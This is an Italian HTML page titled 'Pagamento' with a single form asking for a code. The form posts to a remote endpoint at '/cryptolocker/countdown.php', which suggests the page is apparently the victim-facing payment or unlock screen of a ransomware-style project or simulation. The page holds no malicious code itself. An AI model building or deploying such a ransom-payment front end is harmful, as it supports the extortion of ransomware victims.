<!DOCTYPE html>
<html>
  <head>

    <meta charset="utf-8">

    <title>Pagamento</title>

    <!-- Bootstrap Core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,300italic,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="vendor/simple-line-icons/css/simple-line-icons.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="css/stylish-portfolio.min.css" rel="stylesheet">

  </head>

<body class="content-section bg-primary text-white text-center">

	<!-- Form di pagamento -->
    <section class="content-section bg-primary text-center">
      <div class="container">
        <div class="content-section-heading">
          <h2 class="mb-5" style="color:#ffd480;">Inserisci il codice</h2>
        </div>
		<form action="https://www.divini5g.com/cryptolocker/countdown.php" method="post">
			<div class="form-group">
				<input type="text" name="utente" class="form-control" id="utente" placeholder="Codice" required>
			</div>
			<br />
			<input type="submit" name="invio" value="Accedi" class="btn btn-success" role="button"/> 
			<input type="reset" name="cancella" value="Annulla"class="btn btn-info" role="button"/>
			<br />
			<br />
		</form>
      </div>
    </section>
</body>
</html>